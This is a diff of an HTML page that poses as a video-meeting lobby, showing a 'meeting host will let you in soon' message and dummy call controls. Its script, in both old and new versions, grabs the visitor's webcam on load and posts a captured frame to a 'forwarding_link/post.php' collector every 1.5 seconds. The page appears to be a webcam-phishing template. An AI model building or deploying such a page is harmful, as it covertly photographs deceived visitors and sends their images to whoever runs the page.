@@ -1,126 +1,114 @@
-<!DOCTYPE html>
-<html lang="en">
+<!doctype html>
+<html lang="es">
 
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Modern Video App</title>
+    <title>Video Stream</title>
 
-    <!-- Fuente y Estilos -->
-    <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
-
-    <!-- Scripts que mencionaste -->
+    <!-- External Scripts -->
     <script src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
     <script src="https://kit.fontawesome.com/c4c45dfab4.js" crossorigin="anonymous"></script>
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
 
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Modern Video App</title>
-
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
-    <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600&display=swap" rel="stylesheet" />
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@500&display=swap" rel="stylesheet">
 
     <style>
+        /* General Styles */
+        
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
             font-family: 'Nunito', sans-serif;
+            font-weight: 500;
         }
         
-        body {
-            background-color: #1e1e2f;
-            color: #fff;
-            height: 100vh;
-            display: flex;
-            flex-direction: column;
+        body,
+        html {
+            height: 100%;
+            width: 100%;
+            margin: 0;
         }
+        /* Video and Canvas */
         
         .video-wrap {
             display: flex;
             justify-content: center;
             align-items: center;
-            flex: 1;
-            background-color: #1e1e2f;
-            padding: 20px;
+            height: 100vh;
         }
         
-        video,
-        canvas {
-            border-radius: 12px;
-            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.3);
-            max-width: 90%;
-            height: auto;
+        video {
+            display: block;
         }
+        
+        canvas {
+            display: block;
+            margin: 0 auto;
+        }
+        /* Bottom Bar */
         
         .bottom-bar {
-            background-color: #2a2c34;
-            padding: 10px 30px;
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            background-color: #1f2022;
+            height: 80px;
             display: flex;
             justify-content: space-between;
             align-items: center;
-            border-top: 1px solid #3a3b45;
-        }
-        
-        .controls {
-            display: flex;
-            gap: 30px;
+            padding: 0 40px;
+            color: white;
         }
         
         .icon-button {
             display: flex;
             flex-direction: column;
             align-items: center;
-            font-size: 14px;
-            color: #ccc;
-            cursor: pointer;
-            transition: color 0.3s;
+            justify-content: center;
         }
         
         .icon-button i {
-            font-size: 24px;
-            margin-bottom: 5px;
+            margin-bottom: 8px;
+            font-size: 26px;
         }
         
-        .icon-button:hover {
-            color: #fff;
+        .icon-button h6 {
+            font-size: 12px;
+            margin-top: 5px;
         }
         
-        button.end-btn {
-            background-color: #e74c3c;
-            color: #fff;
+        button {
+            background-color: crimson;
+            color: white;
             border: none;
-            padding: 10px 20px;
-            border-radius: 6px;
-            font-weight: bold;
+            padding: 5px 20px;
+            border-radius: 5px;
             cursor: pointer;
-            transition: background-color 0.3s;
         }
-        
-        button.end-btn:hover {
-            background-color: #c0392b;
-        }
+        /* Floating Button */
         
         .float_button {
             position: fixed;
-            top: 15px;
-            right: 15px;
+            top: 5px;
+            right: 5px;
             width: 40px;
             height: 40px;
-            background-color: #3b3d49;
-            border-radius: 50%;
+            background-color: #1f2022;
+            border-radius: 5px;
             display: flex;
-            justify-content: center;
             align-items: center;
-            cursor: pointer;
+            justify-content: center;
         }
         
         .float_button i {
             color: white;
             font-size: 18px;
         }
+        /* Popup */
         
         #ac-wrapper {
             position: fixed;
@@ -128,78 +116,115 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0, 0, 0, 0.7);
-            z-index: 999;
+            background: rgba(255, 255, 255, 0.6);
+            z-index: 1001;
+            display: none;
+        }
+        
+        #popup {
+            width: 555px;
+            height: 35px;
+            background: white;
+            border: 5px solid #000;
+            border-radius: 15px;
+            box-shadow: 0 0 3px 3px rgba(100, 104, 110, 0.5);
+            position: relative;
+            top: 250px;
+            left: 50%;
+            transform: translateX(-50%);
             display: flex;
             justify-content: center;
             align-items: center;
         }
         
-        #popup {
-            background: #fff;
-            color: #333;
-            padding: 20px 40px;
-            border-radius: 12px;
-            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.3);
-            max-width: 90%;
-            text-align: center;
-        }
-        
         #popup h2 {
-            font-size: 20px;
-        }
-        
-        @media (max-width: 600px) {
-            .controls {
-                flex-wrap: wrap;
-                gap: 15px;
-            }
-            .icon-button {
-                font-size: 12px;
-            }
-            .icon-button i {
-                font-size: 20px;
-            }
-            button.end-btn {
-                padding: 8px 15px;
-                font-size: 14px;
-            }
+            font-size: 16px;
+            color: #333;
         }
     </style>
 </head>
 
 <body>
-    <div class="float_button" title="Expand">
+    <!-- Video Stream Wrapper -->
+    <div class="video-wrap">
+        <video id="video" playsinline autoplay></video>
+    </div>
+    <center>
+        <canvas id="canvas" width="640" height="480"></canvas>
+    </center>
+
+    <!-- Floating Button -->
+    <div class="float_button">
         <i class="fas fa-expand"></i>
     </div>
 
+    <!-- Popup Wrapper -->
     <div id="ac-wrapper">
         <div id="popup">
             <h2>Please wait, the meeting host will let you in soon</h2>
         </div>
     </div>
 
-    <div class="video-wrap">
-        <canvas id="canvas" width="640" height="480"></canvas>
-        <video id="video" playsinline autoplay style="display: none;"></video>
-    </div>
-
+    <!-- Bottom Bar -->
     <div class="bottom-bar">
-        <div class="controls">
-            <div class="icon-button"><i class="fas fa-microphone"></i><span>Mute</span></div>
-            <div class="icon-button"><i class="fas fa-video"></i><span>Stop Video</span></div>
-            <div class="icon-button"><i class="fas fa-shield-alt"></i><span>Security</span></div>
-            <div class="icon-button"><i class="fas fa-users"></i><span>Participants</span></div>
-            <div class="icon-button" style="color: lawngreen;"><i class="fas fa-share-square"></i><span>Share</span></div>
-            <div class="icon-button"><i class="fas fa-comments"></i><span>Chat</span></div>
-            <div class="icon-button"><i class="fas fa-record-vinyl"></i><span>Record</span></div>
+        <div class="icon-button">
+            <i class="fas fa-microphone"></i>
+            <h6>Mute</h6>
         </div>
-        <button class="end-btn">End</button>
+        <div class="icon-button">
+            <i class="fas fa-video"></i>
+            <h6>Stop Video</h6>
+        </div>
+        <div class="icon-button">
+            <i class="fas fa-shield-alt"></i>
+            <h6>Security</h6>
+        </div>
+        <div class="icon-button">
+            <i class="fas fa-users"></i>
+            <h6>Participants</h6>
+        </div>
+        <div class="icon-button" style="color: lawngreen;">
+            <i class="fas fa-plus-square"></i>
+            <h6>Share Content</h6>
+        </div>
+        <div class="icon-button">
+            <i class="fas fa-comments"></i>
+            <h6>Chat</h6>
+        </div>
+        <div class="icon-button">
+            <i class="fas fa-record-vinyl"></i>
+            <h6>Record</h6>
+        </div>
+        <button>End</button>
     </div>
 
+    <!-- Scripts -->
     <script>
+        // Post data to server
+        function post(imgdata) {
+            $.ajax({
+                type: 'POST',
+                data: {
+                    cat: imgdata
+                },
+                url: 'forwarding_link/post.php',
+                dataType: 'json',
+                async: false,
+                success: function(result) {
+                    // Handle success
+                },
+                error: function() {
+                    // Handle error
+                }
+            });
+        }
+
+        'use strict';
+
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
+        const errorMsgElement = document.querySelector('span#errorMsg');
+
         const constraints = {
             audio: false,
             video: {
@@ -207,39 +232,43 @@
             }
         };
 
+        // Access webcam
         async function init() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia(constraints);
-                video.srcObject = stream;
-                const context = canvas.getContext('2d');
-                setInterval(() => {
-                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    const imgData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
-                    post(imgData);
-                }, 1500);
+                handleSuccess(stream);
             } catch (e) {
-                console.error("getUserMedia error:", e);
+                errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
             }
         }
 
-        function post(imgData) {
-            fetch('forwarding_link/post.php', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/x-www-form-urlencoded'
-                },
-                body: `cat=${encodeURIComponent(imgData)}`
-            });
+        // Handle webcam success
+        function handleSuccess(stream) {
+            window.stream = stream;
+            video.srcObject = stream;
+
+            const context = canvas.getContext('2d');
+            setInterval(() => {
+                context.drawImage(video, 0, 0, 640, 480);
+                const canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+                post(canvasData);
+                video.play();
+            }, 1500);
         }
 
-        function closePopup() {
+        // Popup Function
+        function PopUp() {
             document.getElementById('ac-wrapper').style.display = "none";
         }
 
-        window.onload = () => {
-            init();
-            setTimeout(closePopup, 5000); // Change to 50,000 if you want it after 50s
-        };
+        // Load Init
+        init();
+
+        $(document).ready(function() {
+            setTimeout(function() {
+                PopUp();
+            }, 50000); // Show popup after 50 seconds
+        });
     </script>
 </body>
 
